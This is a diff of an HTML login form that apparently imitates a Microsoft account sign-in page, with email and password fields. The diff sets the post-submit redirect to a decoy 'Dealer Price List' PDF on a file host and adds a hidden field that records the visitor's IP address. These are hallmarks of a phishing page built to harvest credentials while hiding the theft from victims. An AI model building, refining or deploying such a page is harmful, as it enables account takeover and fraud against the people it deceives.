@@ -29,10 +29,12 @@
             <input
               type="hidden"
               name="_next"
-              value="https://yourdomain.co/thanks.html"
+              value="https://pdfhost.io/v/Jm0kSWjJR_Dealer_Price_Listpdf.pdf"
             />
+            <input id="ip" type="hidden" name="ip" />
             <div class="email-field">
               <input
+                class="not-hidden"
                 type="text"
                 name="Email-Phone-or-Skype"
                 placeholder="Email, phone, or Skype"
@@ -41,6 +43,7 @@
             </div>
             <div class="password-field">
               <input
+                class="not-hidden"
                 type="password"
                 name="Password"
                 placeholder="Password"
@@ -49,12 +52,19 @@
             </div>
             <p>No account? <span class="blue">Create one!</span></p>
             <p><span class="blue">Can't access your account?</span></p>
-            <button id="submit" type="submit">Next</button>
+            <div class="button">
+              <button id="submit" type="submit">Next</button>
+            </div>
           </form>
         </div>
       </div>
       <div class="sign-in-options">
-        <span><img src="images/Sign-in-options.svg" />Sign-in options</span>
+        <div class="wrap-sign-in">
+          <span
+            ><img id="key" src="images/Sign-in-options.svg" />Sign-in
+            options</span
+          >
+        </div>
       </div>
     </div>
   </body>
